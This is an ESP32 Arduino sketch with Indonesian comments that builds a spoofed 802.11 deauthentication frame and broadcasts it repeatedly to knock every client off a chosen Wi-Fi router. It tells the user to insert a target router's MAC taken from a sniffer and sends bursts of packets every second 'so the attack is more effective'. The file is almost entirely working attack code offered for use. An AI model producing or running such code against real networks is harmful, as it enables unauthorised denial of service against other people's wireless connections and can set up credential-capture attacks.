#include <Arduino.h>
#include "esp_wifi.h"

// Struktur paket Deauthentication (26 bytes)
uint8_t deauth_packet[26] = {
    /* 0 - 1  */ 0xC0, 0x00,                         // Frame Control: Deauthentication
    /* 2 - 3  */ 0x3A, 0x01,                         // Duration
    /* 4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast (Semua perangkat)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source: (Alamat MAC Router yang dipalsukan)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID: (Alamat MAC Router)
    /* 22 - 23 */ 0x00, 0x00,                         // Sequence Number
    /* 24 - 25 */ 0x07, 0x00                          // Reason Code: 7 (Class 3 frame from non-associated STA)
};

// Fungsi untuk mengirim paket ke udara
void sendDeauth(uint8_t* mac_ap, int channel) {
    // Masukkan MAC Router ke dalam paket
    for (int i = 0; i < 6; i++) {
        deauth_packet[10 + i] = mac_ap[i];
        deauth_packet[16 + i] = mac_ap[i];
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    
    Serial.printf("Mengirim Deauth ke Channel %d...\n", channel);
}

void setup() {
    Serial.begin(115200);
    
    // Inisialisasi WiFi ke mode yang memungkinkan Packet Injection
    esp_netif_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    Serial.println("Deauther Siap!");
}

void loop() {
    // CONTOH: Ganti XX dengan MAC Address Router target kamu (hasil dari sniffer sebelumnya)
    uint8_t target_ap[6] = {0xXX, 0xXX, 0xXX, 0xXX, 0xXX, 0xXX}; 
    int target_channel = 1; // Sesuaikan dengan channel router target

    // Kirim 10 paket sekaligus agar serangan lebih efektif
    for(int i = 0; i < 10; i++){
        sendDeauth(target_ap, target_channel);
        delay(10); 
    }
    
    delay(1000); // Ulangi setiap detik
}